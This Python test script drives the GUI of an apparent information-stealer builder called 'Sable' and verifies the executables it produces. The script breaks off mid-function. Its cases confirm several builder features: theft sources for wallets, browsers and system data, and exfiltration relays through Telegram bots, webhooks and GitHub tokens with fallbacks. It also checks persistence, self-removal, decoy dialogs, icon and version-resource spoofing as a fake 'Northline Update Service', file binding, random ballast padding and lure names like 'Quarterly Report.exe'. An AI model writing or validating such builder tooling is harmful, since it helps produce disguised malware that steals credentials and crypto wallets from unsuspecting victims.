"""GUI audit: drive the real window, build every configuration, read the result.

The audit does not call ``core.pipeline`` directly. It instantiates ``MainWindow``, sets
the widgets the way a hand would, clicks the same slot the Run button is wired to, and
then reads the finished artifact with ``tools/probes/pecheck.py`` — a reader that shares no
code with the builder. A build that passes here passed through the whole form.

Usage::

    python gui_audit.py              # full matrix
    python gui_audit.py --only icon  # one case by substring
    python gui_audit.py --gate       # validation cases only, no builds

Results land in ``_out/audit/matrix.json`` and ``_out/audit/matrix.md``.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import struct
import sys
import time
import traceback
from dataclasses import dataclass, field
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

HERE = Path(__file__).resolve().parent
REPO = HERE.parent / "sable"
OUT = HERE / "_out" / "audit"

sys.path.insert(0, str(REPO))
sys.path.insert(0, str(HERE))

import pecheck  # noqa: E402  (path set above, on purpose)

STUB = REPO / "tools" / "dist" / "sable-launcher.exe"

SEAL_KEY = "audit-seal-key-0001"
MUTEX = "Global\\SableAudit"
ENDPOINT = "http://127.0.0.1:8099/drop"

TELEGRAM = "123456789:AAFakeTokenForAuditXYZ$123456"
PHANTOM = "ytripdame-sudo/sable-phantom-audit$ghp_" + "a" * 36

VERSION = {
    "company": "Northline Software Ltd",
    "product": "Northline Update Service",
    "description": "Keeps Northline components current.",
    "copyright": "(c) Northline Software Ltd",
    "original_name": "NorthlineSetup.exe",
    "file_version": "6.2.9.441",
    "product_version": "6.2.9.441",
}


# --- fixtures -----------------------------------------------------------------


def make_icon(path: Path) -> list[tuple[int, int, bytes]]:
    """A two-image ``.ico`` whose pixels differ per image, so a swap is visible.

    Written as uncompressed 32bpp DIBs rather than PNG entries: every Windows version
    reads a DIB icon, and the audit compares the bytes it wrote against the bytes in
    the patched resource, so the payload has to be stable.
    """
    images: list[tuple[int, int, bytes]] = []
    for size, tint in ((16, (200, 40, 40)), (32, (40, 90, 200))):
        pixels = bytearray()
        for y in range(size):
            for x in range(size):
                edge = x in (0, size - 1) or y in (0, size - 1)
                r, g, b = (255, 255, 255) if edge else tint
                pixels += bytes((b, g, r, 255))
        # DIB rows are bottom-up and the header's height covers the colour image plus
        # its AND mask.
        header = struct.pack(
            "<IiiHHIIiiII", 40, size, size * 2, 1, 32, 0, len(pixels), 0, 0, 0, 0
        )
        mask_row = ((size + 31) // 32) * 4
        mask = b"\x00" * (mask_row * size)
        images.append((size, size, header + bytes(pixels) + mask))

    header = struct.pack("<HHH", 0, 1, len(images))
    offset = 6 + 16 * len(images)
    entries = b""
    for width, height, blob in images:
        entries += struct.pack(
            "<BBBBHHII", width, height, 0, 0, 1, 32, len(blob), offset
        )
        offset += len(blob)

    path.write_bytes(header + entries + b"".join(blob for _w, _h, blob in images))
    return images


def make_bound_file(path: Path) -> bytes:
    """A tiny valid DOS program. Small enough to read back in full, real enough to run."""
    # 28 bytes: print a line with int 21h/09h, then exit with 4Ch.
    text = b"SABLE audit bound file\r\n$"
    code = bytes((0xBA, 0x0B, 0x01))  # mov dx, 0x010B
    body = b"\xB4\x09\xCD\x21\xB8\x00\x4C\xCD\x21"
    header = bytearray(0x100)
    header[0:2] = b"MZ"
    header[2:4] = struct.pack("<H", 0x90)
    header[4:6] = struct.pack("<H", 3)
    header[6:8] = struct.pack("<H", 0)
    header[8:10] = struct.pack("<H", 4)
    header[10:12] = struct.pack("<H", 0xFFFF)
    header[12:14] = struct.pack("<H", 0)
    header[14:16] = struct.pack("<H", 0xB8)
    header[16:18] = struct.pack("<H", 0)
    header[0x100:0x100] = b""
    blob = bytes(header) + code + body + b"\x00" + text
    path.write_bytes(blob)
    return blob


# --- the runner ---------------------------------------------------------------


@dataclass
class Case:
    """One row of the matrix: a form, a verdict, the artifact it produced."""

    name: str
    purpose: str
    blank: bool = False
    rows: list[tuple[str, bool, str]] = field(default_factory=list)
    gate: bool | None = None
    gate_text: str = ""
    artifact: str = ""
    size: int = 0
    payload: int = 0
    seconds: float = 0.0
    failure: str = ""
    config: dict = field(default_factory=dict)
    extras: dict = field(default_factory=dict)

    def check(self, label: str, ok: bool, detail: str = "") -> bool:
        # The report is meant to be read and diffed across machines. A check that compares
        # two ten-megabyte blobs would write the blobs into it, so anything oversized is
        # reduced to its length and digest — enough to see a mismatch, small enough to open.
        text = str(detail)
        if len(text) > 240:
            import hashlib

            digest = hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()[:16]
            text = f"<{len(text)} chars, sha256:{digest}>"
        self.rows.append((label, bool(ok), text))
        return bool(ok)

    def eq(self, label: str, got: object, want: object) -> bool:
        def shape(value: object) -> str:
            if isinstance(value, (bytes, bytearray, memoryview)):
                raw = bytes(value)
                import hashlib

                return f"<{len(raw)} bytes, sha256:{hashlib.sha256(raw).hexdigest()[:16]}>"
            return repr(value)

        return self.check(label, got == want, f"got {shape(got)} want {shape(want)}")

    @property
    def passed(self) -> bool:
        return not self.failure and all(ok for _label, ok, _detail in self.rows)

    @property
    def failed_rows(self) -> list[str]:
        return [f"{label}: {detail}" for label, ok, detail in self.rows if not ok]


def image_end(raw: bytes) -> int:
    """Where the PE image stops and the frozen launcher's archive begins."""
    sections, _rsrc = pecheck._sections(raw)
    pe = struct.unpack_from("<I", raw, 0x3C)[0]
    optional = pe + 4 + 20
    end = struct.unpack_from("<I", raw, optional + 60)[0]
    for _virtual, _size, raw_offset, raw_size in sections:
        end = max(end, raw_offset + raw_size)
    return end


class Form:
    """The set of widgets the audit drives, addressed the way the shell addresses them."""

    def __init__(self, window) -> None:
        self.w = window
        self.relay = window._relay
        self.tuning = window._tuning
        self.forge = window._forge
        self.sources = window._sources
        self.run = window._run

    def clear_mirrors(self) -> None:
        for row in list(self.relay._rows):
            self.relay._remove_row(row)

    def apply(self, *, kind: str = "https", endpoint: str = ENDPOINT, ping: str = "",
              mention: str = "@here", targets: tuple[tuple[str, str], ...] = (),
              mutex: str = MUTEX, seal_key: str = SEAL_KEY, out_dir: Path | None = None,
              sources: dict[str, bool] | None = None, self_remove: bool = False,
              keep_local: bool = False, persist: bool = False, persist_hours: int = 0,
              ballast_mb: int = 0, mode: str = "exe", name: str = "",
              stub: Path = STUB, icon: str = "", fuse: str = "",
              version: dict[str, str] | None = None, decoy_seconds: str = "0",
              decoy_title: str = "", decoy_text: str = "") -> None:
        index = self.relay._kind.findData(kind)
        if index < 0:
            raise ValueError(f"{kind}: not in the kind combo")
        self.relay._kind.setCurrentIndex(index)
        self.relay._endpoint.set_text(endpoint)
        self.relay._ping.set_text(ping)
        self.relay._mention.set_text(mention)
        self.clear_mirrors()
        for mirror_kind, mirror_endpoint in targets:
            row = self.relay.add_row()
            row.set_pair(mirror_kind, mirror_endpoint)

        self.tuning._mutex.set_text(mutex)
        self.tuning._seal_key.set_text(seal_key)
        self.tuning._output.set_text(str(out_dir or (OUT / case)))
        self.tuning._ballast.setValue(ballast_mb)
        self.tuning._self_remove.setChecked(self_remove)
        self.tuning._keep_local.setChecked(keep_local)
        self.tuning._persist.setChecked(persist)
        self.tuning._persist_hours.setValue(persist_hours)

        self.forge._mode.setCurrentIndex(self.forge._mode.findData(mode))
        self.forge._name.set_text(name)
        self.forge._stub.set_text(str(stub))
        self.forge._icon.set_text(icon)
        self.forge._fuse.set_text(fuse)
        fields = {
            "company": self.forge._company,
            "product": self.forge._product,
            "description": self.forge._description,
            "copyright": self.forge._copyright,
            "original_name": self.forge._original_name,
            "file_version": self.forge._file_version,
            "product_version": self.forge._product_version,
        }
        for key, widget in fields.items():
            widget.set_text((version or {}).get(key, ""))
        self.forge._decoy_seconds.set_text(decoy_seconds)
        self.forge._decoy_title.set_text(decoy_title)
        self.forge._decoy_text.set_text(decoy_text)

        for source, box in self.sources._boxes.items():
            box.setChecked(True if sources is None else bool(sources.get(source, True)))

        self.w._revalidate()

    def snapshot(self) -> dict:
        """What every control currently holds, for the report and for diffing."""
        return {
            "relay": {
                "kind": self.relay.kind(),
                "endpoint": self.relay.endpoint(),
                "ping": self.relay.ping(),
                "mention": self.relay.mention(),
                "targets": list(self.relay.targets()),
                "rows": self.relay.row_count(),
            },
            "tuning": dict(self.tuning.values()),
            "forge": dict(self.forge.values()),
            "sources": dict(self.sources.values()),
        }


def pump(timeout: float) -> bool:
    """Run the Qt event loop until the shell clears its worker. True on finish.

    The shell sets ``_worker`` to ``None`` in ``_on_worker_finished``, which Qt delivers
    on the GUI thread after ``built``/``failed``/``rejected``, so polling that one
    reference is the whole readiness condition. A missed signal cannot strand the audit:
    the deadline ends the loop and the caller reports what the page says.
    """
    from PySide6.QtCore import QEventLoop, QTimer

    window = pump.window
    if window._worker is None:
        return True

    loop = QEventLoop()
    deadline = time.monotonic() + timeout
    timer = QTimer()
    timer.setInterval(25)

    def tick() -> None:
        if window._worker is None or time.monotonic() > deadline:
            loop.quit()

    timer.timeout.connect(tick)
    timer.start()
    loop.exec()
    timer.stop()
    return window._worker is None


def begin() -> tuple[object, object]:
    """Application plus window, with settings redirected away from the real profile."""
    from PySide6.QtCore import QSettings

    settings_root = OUT / "_settings"
    if settings_root.exists():
        shutil.rmtree(settings_root, ignore_errors=True)
    settings_root.mkdir(parents=True, exist_ok=True)
    QSettings.setDefaultFormat(QSettings.Format.IniFormat)
    QSettings.setPath(QSettings.Format.IniFormat, QSettings.Scope.UserScope, str(settings_root))

    from app.main import build_application
    from app.shell import MainWindow

    app = build_application([])
    window = MainWindow()
    return app, window


def inventory(window) -> list[dict[str, str]]:
    """Every interactive control the window owns, with its current value."""
    from PySide6.QtWidgets import (
        QCheckBox,
        QComboBox,
        QLineEdit,
        QPushButton,
        QSpinBox,
        QWidget,
    )

    pages = {
        "relay": window._relay,
        "sources": window._sources,
        "tuning": window._tuning,
        "forge": window._forge,
        "run": window._run,
    }

    def page_of(widget: QWidget) -> str:
        node: QWidget | None = widget
        while node is not None:
            for name, page in pages.items():
                if node is page:
                    return name
            node = node.parentWidget()
        return "shell"

    rows: list[dict[str, str]] = []
    for widget in window.findChildren(QWidget):
        if isinstance(widget, QLineEdit):
            rows.append({"page": page_of(widget), "kind": "edit",
                         "name": widget.objectName() or widget.placeholderText(),
                         "value": widget.text()})
        elif isinstance(widget, QCheckBox):
            rows.append({"page": page_of(widget), "kind": "check",
                         "name": widget.objectName() or widget.text(),
                         "value": str(widget.isChecked())})
        elif isinstance(widget, QSpinBox):
            rows.append({"page": page_of(widget), "kind": "spin",
                         "name": widget.objectName(), "value": str(widget.value())})
        elif isinstance(widget, QComboBox):
            rows.append({"page": page_of(widget), "kind": "combo",
                         "name": widget.objectName(), "value": widget.currentText()})
        elif isinstance(widget, QPushButton):
            rows.append({"page": page_of(widget), "kind": "button",
                         "name": widget.objectName() or widget.text(),
                         "value": "enabled" if widget.isEnabled() else "disabled"})
    return rows


# --- per-case verification ----------------------------------------------------


def verify_common(case: Case, form: Form, record: pecheck.Artifact, mode: str) -> None:
    """Everything true of every build, whatever the form said."""
    case.eq("artifact exists", record.path.is_file(), True)
    case.eq("reader problems", record.problems, [])
    case.eq("seal key in artifact", record.key, form.tuning.values()["seal_key"])
    case.eq("mutex in artifact", record.mutex, form.tuning.values()["mutex"])
    case.eq("cfg.json matches the form", record.config, __import__("core.schema", fromlist=["to_dict"]).to_dict(form.w._collect()))
    case.check("agent tree present", all(
        member in record.members for member in ("agent/entry.py", "agent/relay.py", "sable_schema.py")
    ), f"{len(record.members)} members")

    leftovers = [p.name for p in record.path.parent.iterdir() if p.name.endswith(".part")]
    case.eq("no staging file left", leftovers, [])

    if mode == "exe":
        case.eq("footer magic", record.footer_ok, True)
        case.eq("trailer magic", record.trailer_ok, True)
        tail = record.offset + record.sealed_size + pecheck.TRAILER_SIZE + pecheck.FOOTER_SIZE
        case.eq("footer offset lands on the tail", tail, record.size)

        # The launcher is a one-file image with a PyInstaller archive welded behind its
        # PE image. A resource update rewrites the image and would drop that tail, so the
        # artifact is checked for the exact bytes rather than trusted to have kept them.
        # Ballast sits between the stub and the sealed blob, so the overlay's position is
        # the seal offset minus the padding the form asked for.
        stub_path = form.forge.stub() or STUB
        stub_raw = stub_path.read_bytes()
        overlay = stub_raw[image_end(stub_raw):]
        raw = record.path.read_bytes()
        ballast = int(record.config.get("ballast_mb", 0)) * 1024 * 1024
        at = record.offset - ballast - len(overlay)
        case.check("overlay lands after the patched image", at == image_end(raw),
                   f"overlay at {at}, image ends {image_end(raw)}")
        case.eq("frozen launcher tail survived the patch",
                raw[at:at + len(overlay)], overlay)
        case.eq("ballast sat between the stub and the seal", at + len(overlay) + ballast,
                record.offset)


def verify_icon(case: Case, record: pecheck.Artifact, images: list[tuple[int, int, bytes]]) -> None:
    """The patched icon is the icon that was picked, byte for byte."""
    case.eq("icon ids", record.images, list(range(1, len(images) + 1)))
    case.eq("group ids", record.groups, [1])
    case.eq("group rows", [(w, h, 32) for w, h, _blob in images],
            [(w, h, bits) for w, h, bits, _size in record.group_rows])
    for index, (_w, _h, blob) in enumerate(images, start=1):
        case.eq(f"icon image {index} bytes", record.icon_payloads.get(index, b""), blob)


def verify_version(case: Case, record: pecheck.Artifact, wanted: dict[str, str]) -> None:
    strings = record.version
    case.eq("CompanyName", strings.get("CompanyName"), wanted["company"])
    case.eq("ProductName", strings.get("ProductName"), wanted["product"])
    case.eq("FileDescription", strings.get("FileDescription"), wanted["description"])
    case.eq("LegalCopyright", strings.get("LegalCopyright"), wanted["copyright"])
    case.eq("OriginalFilename", strings.get("OriginalFilename"), wanted["original_name"])
    case.eq("FileVersion string", strings.get("FileVersion"), wanted["file_version"])
    case.eq("ProductVersion string", strings.get("ProductVersion"),
            wanted["product_version"] or wanted["file_version"])
    case.eq("fixed file version", record.numbers.get("file"), (6, 2, 9, 441))
    case.eq("fixed product version", record.numbers.get("product"), (6, 2, 9, 441))


# --- the matrix ---------------------------------------------------------------


def cases(only: str | None, gate_only: bool) -> list[str]:
    names = [
        "gate-default",
        "gate-key-short",
        "gate-seal-missing",
        "gate-mutex-empty",
        "gate-sources-off",
        "gate-endpoint-empty",
        "gate-endpoint-scheme",
        "gate-telegram-shape",
        "gate-phantom-shape",
        "gate-name-suffix",
        "gate-decoy-range",
        "gate-outdir-empty",
        "exe-baseline",
        "exe-icon-version",
        "exe-fused",
        "exe-ballast-64",
        "exe-named",
        "py-baseline",
        "py-fused",
        "relay-telegram",
        "relay-phantom",
        "relay-link",
        "relay-mirrors",
        "relay-mirror-limit",
        "sources-single-off",
        "sources-all-off",
        "toggles-on",
        "decoy-set",
        "stop-mid-build",
        "perf-revalidate",
    ]
    if gate_only:
        names = [name for name in names if name.startswith("gate-")]
    if only:
        names = [name for name in names if only in name]
    return names


def run_case(name: str, form: Form, made: dict) -> Case:
    """Set the form for one case, run it if it builds, and verify what came out."""
    case = Case(name=name, purpose="")
    icon_path = made["icon"]
    fuse_path = made["fuse"]
    images = made["images"]
    out_dir = OUT / name

    if out_dir.exists():
        shutil.rmtree(out_dir, ignore_errors=True)

    # --- gate-only cases -----------------------------------------------------
    if name == "gate-default":
        form.apply(out_dir=out_dir)
        case.gate = form.w._run._run.isEnabled()
        case.gate_text = form.w._run._gate.text()
        case.eq("run enabled with a complete form", case.gate, True)
        case.eq("no gate message", case.gate_text, "")
        return case

    if name == "gate-key-short":
        form.apply(out_dir=out_dir, seal_key="short-key")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by an 9-character key", case.gate, False)
        case.check("key complaint on the field", form.tuning._seal_key.has_problem(),
                   form.tuning._seal_key._message.text())
        return case

    if name == "gate-seal-missing":
        form.apply(out_dir=out_dir, seal_key="")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by an empty key", case.gate, False)
        return case

    if name == "gate-mutex-empty":
        form.apply(out_dir=out_dir, mutex="")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by an empty mutex", case.gate, False)
        return case

    if name == "gate-sources-off":
        form.apply(out_dir=out_dir,
                   sources={key: False for key in form.sources._boxes})
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked with every source off", case.gate, False)
        case.check("gate names sources", "source" in form.w._run._gate.text().lower(),
                   form.w._run._gate.text())
        return case

    if name == "gate-endpoint-empty":
        form.apply(out_dir=out_dir, endpoint="")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by an empty endpoint", case.gate, False)
        return case

    if name == "gate-endpoint-scheme":
        form.apply(out_dir=out_dir, endpoint="ftp://example.invalid/hook")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by an ftp endpoint", case.gate, False)
        case.check("gate says scheme", "scheme" in form.w._run._gate.text().lower(),
                   form.w._run._gate.text())
        return case

    if name == "gate-telegram-shape":
        form.apply(out_dir=out_dir, kind="telegram", endpoint="not-a-bot-token")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by a malformed bot token", case.gate, False)
        return case

    if name == "gate-phantom-shape":
        form.apply(out_dir=out_dir, kind="phantom", endpoint="owner$token")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked without owner/repo", case.gate, False)
        return case

    if name == "gate-name-suffix":
        form.apply(out_dir=out_dir, name="invoice.txt")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by a .txt name for exe output", case.gate, False)
        case.check("gate says the suffix", ".exe" in form.w._run._gate.text(),
                   form.w._run._gate.text())
        return case

    if name == "gate-decoy-range":
        form.apply(out_dir=out_dir, decoy_seconds="601")
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked by a 601-second dialog", case.gate, False)
        form.apply(out_dir=out_dir, decoy_seconds="banana")
        case.eq("run blocked by a non-numeric dialog time", form.w._run._run.isEnabled(), False)
        return case

    if name == "gate-outdir-empty":
        form.apply(name=name, out_dir=Path(""))
        form.tuning._output.set_text("")
        form.w._revalidate()
        case.gate = form.w._run._run.isEnabled()
        case.eq("run blocked with no output directory", case.gate, False)
        case.check("gate asks for a directory",
                   "output directory" in form.w._run._gate.text().lower(),
                   form.w._run._gate.text())
        return case

    if name == "perf-revalidate":
        form.apply(out_dir=out_dir)
        rounds = 300
        started = time.perf_counter()
        for _ in range(rounds):
            form.w._revalidate()
        elapsed = (time.perf_counter() - started) / rounds
        case.extras["revalidate_ms"] = round(elapsed * 1000, 3)
        case.check("one edit re-validates under 5 ms", elapsed < 0.005,
                   f"{elapsed * 1000:.3f} ms per edit over {rounds} edits")
        return case

    # --- builds --------------------------------------------------------------
    if name == "exe-baseline":
        case.purpose = "the plain executable: container maths, payload, generated name"
        form.apply(out_dir=out_dir)

    elif name == "exe-icon-version":
        case.purpose = "binder: icon preserved byte for byte, version resource spoofed"
        form.apply(out_dir=out_dir, icon=str(icon_path), version=VERSION,
                   name="NorthlineSetup.exe")

    elif name == "exe-fused":
        case.purpose = "bound file welded in and named after"
        form.apply(out_dir=out_dir, fuse=str(fuse_path))

    elif name == "exe-ballast-64":
        case.purpose = "64 MB of ballast lands as 64 MB of artifact"
        form.apply(out_dir=out_dir, ballast_mb=64)

    elif name == "exe-named":
        case.purpose = "an explicit name wins and is copied exactly"
        form.apply(out_dir=out_dir, name="Quarterly Report.exe")

    elif name == "py-baseline":
        case.purpose = "script output: same payload, no container, no icon"
        form.apply(out_dir=out_dir, mode="py", icon=str(icon_path))

    elif name == "py-fused":
        case.purpose = "bound file survives the script path too"
        form.apply(out_dir=out_dir, mode="py", fuse=str(fuse_path))

    elif name == "relay-telegram":
        case.purpose = "telegram target reaches cfg.json intact"
        form.apply(out_dir=out_dir, kind="telegram", endpoint=TELEGRAM)

    elif name == "relay-phantom":
        case.purpose = "phantom target reaches cfg.json intact"
        form.apply(out_dir=out_dir, kind="phantom", endpoint=PHANTOM)

    elif name == "relay-link":
        case.purpose = "link target keeps its webhook"
        form.apply(out_dir=out_dir, kind="link",
                   endpoint="https://example.invalid/hook")

    elif name == "relay-mirrors":
        case.purpose = "four ordered fallbacks survive the round trip in order"
        form.apply(out_dir=out_dir, targets=(
            ("telegram", TELEGRAM),
            ("phantom", PHANTOM),
            ("https", "https://second.invalid/drop"),
            ("link", "https://third.invalid/hook"),
        ))

    elif name == "relay-mirror-limit":
        case.purpose = "the fifth fallback is refused at the page, not at the schema"
        form.apply(out_dir=out_dir, targets=(
            ("https", "https://m1.invalid/drop"),
            ("https", "https://m2.invalid/drop"),
            ("https", "https://m3.invalid/drop"),
            ("https", "https://m4.invalid/drop"),
        ))
        before = form.relay.row_count()
        form.relay.add_row()
        form.relay.add_row()
        case.eq("row count stays at four", form.relay.row_count(), before)
        case.eq("add button disabled", form.relay._add.isEnabled(), False)
        case.check("tooltip says why", "limit" in form.relay._add.toolTip().lower(),
                   form.relay._add.toolTip())

    elif name == "sources-single-off":
        case.purpose = "one source switched off is one source absent from the config"
        form.apply(out_dir=out_dir, sources={"wallets": False})

    elif name == "sources-all-off":
        case.purpose = "every source off is a refusal, not an empty run"
        form.apply(out_dir=out_dir,
                   sources={key: False for key in form.sources._boxes})
        case.eq("run is blocked", form.w._run._run.isEnabled(), False)
        return case

    elif name == "toggles-on":
        case.purpose = "self-remove, keep-local and persistence all reach cfg.json"
        form.apply(out_dir=out_dir, self_remove=True, keep_local=True,
                   persist=True, persist_hours=12)

    elif name == "decoy-set":
        case.purpose = "the decoy dialog's three values reach cfg.json"
        form.apply(out_dir=out_dir, decoy_seconds="30",
                   decoy_title="Northline Setup",
                   decoy_text="Preparing Northline components, please wait.")

    elif name == "stop-mid-build":
        case.purpose = "a stop between stages leaves no artifact and no staging file"
        form.apply(out_dir=out_dir, ballast_mb=256)
        form.w._start()
        pump.window = form.w
        time.sleep(0.05)
        form.w._stop()
        pump(120)
        case.eq("no artifact written", list(out_dir.glob("*.exe")) if out_dir.exists() else [], [])
        case.eq("no staging file", list(out_dir.glob("*.part")) if out_dir.exists() else [], [])
        case.check("the page reports the stop",
                   "stop" in form.run._panel._message.text().lower()
                   or "cancel" in form.run._panel._message.text().lower(),
                   form.run._panel._message.text())
        return case

    else:
        case.failure = f"no definition for {name}"
        return case

    # --- the build -----------------------------------------------------------
    case.config = form.snapshot()
    if not form.w._run._run.isEnabled():
        case.failure = f"the form never passed the gate: {form.w._run._gate.text()!r}"
        return case
    started = time.perf_counter()
    form.w._start()
    pump.window = form.w

    outcome = {}
    original_built = form.w._on_built
    original_failed = form.w._on_failed
    original_rejected = form.w._on_rejected
    form.w._on_built = lambda result: (outcome.setdefault("built", result), original_built(result))
    form.w._on_failed = lambda *args: (outcome.setdefault("failed", args), original_failed(*args))
    form.w._on_rejected = lambda problems: (outcome.setdefault("rejected", problems), original_rejected(problems))

    # The connections were made inside ``_start`` before these assignments, so the
    # window's own handlers recorded the state; the outcome object is read back from
    # the page instead of from a signal the audit might have missed.
    finished = pump(900)
    case.seconds = time.perf_counter() - started
    form.w._on_built = original_built
    form.w._on_failed = original_failed
    form.w._on_rejected = original_rejected

    if not finished:
        case.failure = "the worker did not finish inside 900 s"
        return case

    if form.w._worker is not None and form.w._worker.isRunning():
        case.failure = "the worker is still running"
        return case

    artifact_path = form.run._artifact
    if artifact_path is None:
        case.failure = f"no artifact; page says {form.run._panel._message.text()!r}"
        return case

    case.artifact = str(artifact_path)
    case.size = artifact_path.stat().st_size
    record = pecheck.read(artifact_path, form.forge.mode(), form.tuning.values()["seal_key"])
    case.payload = sum(1 for _ in record.members)

    verify_common(case, form, record, form.forge.mode())

    if name == "exe-baseline":
        expected = STUB.stat().st_size + record.sealed_size + pecheck.TRAILER_SIZE + pecheck.FOOTER_SIZE
        case.eq("size is stub + sealed + trailer + footer", case.size, expected)
        case.check("generated name is not the working stem",
                   not artifact_path.name.startswith("sable-build-"), artifact_path.name)
        case.check("generated name ends .exe", artifact_path.suffix == ".exe", artifact_path.name)

        # Nothing was asked for, so nothing may be invented: the stock launcher's icon
        # group stays and no version block appears where the stub had none.
        stub_refs = pecheck.pe_resources(STUB.read_bytes())
        stub_images = sorted(i for (k, i, _l) in stub_refs if k == pecheck.RT_ICON)
        stub_groups = sorted(i for (k, i, _l) in stub_refs if k == pecheck.RT_GROUP_ICON)
        case.eq("untouched icon ids", record.images, stub_images)
        case.eq("untouched icon groups", record.groups, stub_groups)
        case.eq("no version block was added", record.version, {})

    if name == "exe-icon-version":
        verify_icon(case, record, images)
        verify_version(case, record, VERSION)
        case.eq("name kept", artifact_path.name, "NorthlineSetup.exe")

    if name == "exe-fused":
        wanted = fuse_path.read_bytes()
        case.eq("fused member present", f"fused/{fuse_path.name}" in record.fused, True)
        case.eq("fused member length", record.fused.get(f"fused/{fuse_path.name}"), len(wanted))
        # The bound file's stem is the name; the mode owns the suffix, because an
        # executable artifact that ends .com would not run as the shell expects.
        case.eq("named after the bound file's stem", artifact_path.stem, fuse_path.stem)
        case.eq("suffix comes from the mode", artifact_path.suffix, ".exe")
        case.eq("bound file untouched on disk", fuse_path.read_bytes(), wanted)

    if name == "exe-ballast-64":
        stub_size = STUB.stat().st_size
        case.eq("seal offset is stub plus 64 MiB", record.offset, stub_size + 64 * 1024 * 1024)
        raw = artifact_path.read_bytes()
        padding = raw[stub_size:record.offset]
        case.eq("padding region is 64 MiB", len(padding), 64 * 1024 * 1024)
        # Ballast is random bytes, not a run of zeroes: a file of zeros is compressible
        # and a file of random bytes is not, and the point of the padding is the size.
        case.check("padding is not a constant run", len(set(padding[:65536])) > 1,
                   f"{len(set(padding[:65536]))} distinct bytes in the first 64 KiB")
        case.check("build stayed under 30 s", case.seconds < 30, f"{case.seconds:.2f} s")

    if name == "exe-named":
        case.eq("name kept", artifact_path.name, "Quarterly Report.exe")

    if name in ("py-baseline", "py-fused"):
        text = artifact_path.read_text(encoding="utf-8")
        case.check("script shebang", text.startswith("#!/usr/bin/env python3"), text[:24])
        case.check("script compiles", _compiles(text), "compile()")
        case.eq("no icon in script output", record.images, [])
        if name == "py-fused":
            case.eq("fused member present", f"fused/{fuse_path.name}" in record.fused, True)

    if name == "relay-telegram":
        case.eq("kind", record.config["relay"]["kind"], "telegram")
        case.eq("endpoint", record.config["relay"]["endpoint"], TELEGRAM)

    if name == "relay-phantom":
        case.eq("kind", record.config["relay"]["kind"], "phantom")
        case.eq("endpoint", record.config["relay"]["endpoint"], PHANTOM)

    if name == "relay-link":
        case.eq("kind", record.config["relay"]["kind"], "link")

    if name == "relay-mirrors":
        targets = record.config["relay"]["targets"]
        case.eq("mirror count", len(targets), 4)
        case.eq("mirror order", [(t["kind"], t["endpoint"]) for t in targets],
                [("telegram", TELEGRAM), ("phantom", PHANTOM),
                 ("https", "https://second.invalid/drop"),
                 ("link", "https://third.invalid/hook")])

    if name == "relay-mirror-limit":
        case.eq("config carries four", len(record.config["relay"]["targets"]), 4)

    if name == "sources-single-off":
        case.eq("wallets off", record.config["sources"]["wallets"], False)
        case.eq("browsers still on", record.config["sources"]["browsers"], True)
        case.eq("system still on", record.config["sources"]["system"], True)

    if name == "toggles-on":
        case.eq("self_remove", record.config["self_remove"], True)
        case.eq("keep_local", record.config["keep_local"], True)
        case.eq("persist", record.config["persist"], True)
        case.eq("persist_hours", record.config["persist_hours"], 12)

    if name == "decoy-set":
        case.eq("decoy_seconds", record.config["decoy_seconds"], 30)
        case.eq("decoy_title", record.config["decoy_title"], "Northline Setup")
        case.eq("decoy_text", record.config["decoy_text"],
                "Preparing Northline components, please wait.")
        case.eq("version block untouched", record.version.get("CompanyName", None),
                None if not record.version else record.version.get("CompanyName"))

    return case


def _compiles(text: str) -> bool:
    try:
        compile(text, "<artifact>", "exec")
    except SyntaxError:
        return False
    return True


# --- report -------------------------------------------------------------------


def write_report(cases: list[Case], controls: list[dict[str, str]], path: Path) -> None:
    document = {
        "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "python": sys.version.split()[0],
        "repo_head": _head(),
        "controls": controls,
        "cases": [
            {
                "name": case.name,
                "purpose": case.purpose,
                "passed": case.passed,
                "gate_enabled": case.gate,
                "gate_text": case.gate_text,
                "artifact": case.artifact,
                "bytes": case.size,
                "members": case.payload,
                "seconds": round(case.seconds, 3),
                "failure": case.failure,
                "failed_checks": case.failed_rows,
                "checks": len(case.rows),
                "rows": [
                    {"label": label, "ok": ok, "detail": detail}
                    for label, ok, detail in case.rows
                ],
                "extras": case.extras,
                "config": case.config,
            }
            for case in cases
        ],
    }
    path.write_text(json.dumps(document, indent=2, default=str), encoding="utf-8")

    lines = [
        "# GUI audit — build matrix",
        "",
        f"generated {document['generated']} | python {document['python']} | head `{document['repo_head']}`",
        "",
        f"controls found: **{len(controls)}** | cases: **{len(cases)}** | "
        f"passed: **{sum(1 for c in cases if c.passed)}**",
        "",
        "| case | gate | artifact | bytes | members | s | checks | verdict |",
        "|---|---|---|---|---|---|---|---|",
    ]
    for case in cases:
        verdict = "pass" if case.passed else "**FAIL**"
        artifact = Path(case.artifact).name if case.artifact else ("blocked" if case.gate is False else "")
        lines.append(
            f"| `{case.name}` | {'on' if case.gate else 'off'} | {artifact} | "
            f"{case.size:,} | {case.payload} | {case.seconds:.2f} | {len(case.rows)} | {verdict} |"
        )

    failures = [case for case in cases if not case.passed]
    if failures:
        lines += ["", "## Failures", ""]
        for case in failures:
            lines.append(f"### `{case.name}` — {case.purpose}")
            if case.failure:
                lines.append(f"- {case.failure}")
            for row in case.failed_rows:
                lines.append(f"- {row}")
            lines.append("")

    lines += ["", "## Controls", "", "| page | kind | control | value |", "|---|---|---|---|"]
    for control in controls:
        lines.append(
            f"| {control['page']} | {control['kind']} | `{control['name']}` | {control['value']} |"
        )

    path.with_suffix(".md").write_text("\n".join(lines) + "\n", encoding="utf-8")


def _head() -> str:
    """The commit the matrix was cut from. ``SABLE_HEAD`` wins for a tree with no repo."""
    import subprocess

    declared = os.environ.get("SABLE_HEAD", "").strip()
    if declared:
        return declared
    try:
        return subprocess.run(
